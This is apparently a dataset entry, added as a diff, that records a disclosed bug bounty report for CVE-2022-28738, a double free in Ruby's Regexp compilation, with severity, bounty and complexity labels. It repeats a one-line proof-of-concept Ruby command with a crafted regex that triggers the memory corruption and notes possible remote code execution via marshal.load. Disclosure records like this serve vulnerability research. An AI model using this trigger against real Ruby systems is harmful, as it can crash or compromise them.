@@ -1,0 +1,34 @@
+{
+  "reported_to": "Internet Bug Bounty",
+  "reported_by": "piao ",
+  "title": "CVE-2022-28738: Double free in Regexp compilation",
+  "content": "\nDue to a bug in the Regexp compilation process, creating a Regexp object with a crafted source string could cause the same memory to be freed twice. This is known as a \u201cdouble free\u201d vulnerability. Note that, in general, it is considered unsafe to create and use a Regexp object generated from untrusted input. In this case, however, following a comprehensive assessment, we treat this issue as a vulnerability.\npoc:\nCode 220 Bytes\n1ruby -e '/(\\\\x15\\\\x17\\\\xE2\\\\xF5\\\\xF5\\\\xF5\\\\xC2\\\\x04\\\\x08J,\\\\x00\\\\xD0\\\\x00\\\\x00(?(1)\\\\xF5\\\\xF5\\\\xF5\\\\xD7\\\\xF5\\\\xF5\\\\xF5\\\\x87\\\\x04\\\\xFA555\\\\xBEJ,\\\\x18FF\\\\x15\\\\xFF|\\\\x03\\\\x01\\\\x00\\\\x01\\\\x00\\\\x00\\\\x8F\\r|)44\\\\x00\\\\x8F\\r|)+/m'\nImpact\nmay lead to a RCE attack cooperate with marshal.load\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 4000,
+  "weaknesses": [
+    "Double Free"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1653776280,
+  "report_url": "https://hackerone.com/reports/1549636",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Execute the Ruby command with the crafted regex pattern: ruby -e '/(\\\\x15\\\\x17\\\\xE2\\\\xF5\\\\xF5\\\\xF5\\\\xC2\\\\x04\\\\x08J,\\\\x00\\\\xD0\\\\x00\\\\x00(?(1)\\\\xF5\\\\xF5\\\\xF5\\\\xD7\\\\xF5\\\\xF5\\\\xF5\\\\x87\\\\x04\\\\xFA555\\\\xBEJ,\\\\x18FF\\\\x15\\\\xFF|\\\\x03\\\\x01\\\\x00\\\\x01\\\\x00\\\\x00\\\\x8F\\r|)44\\\\x00\\\\x8F\\r|)+/m'"
+    ]
+  ],
+  "vuln_description": "A double free vulnerability in the Regexp compilation process allows crafted regex patterns to free the same memory twice, potentially leading to remote code execution when combined with marshal.load.",
+  "reason": "The vulnerability requires crafting a specific regex pattern that triggers the double free. While the pattern is complex, the attack itself is straightforward once the pattern is known. The interaction between the regex compilation and memory management is subtle but does not involve multiple components or complex states.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
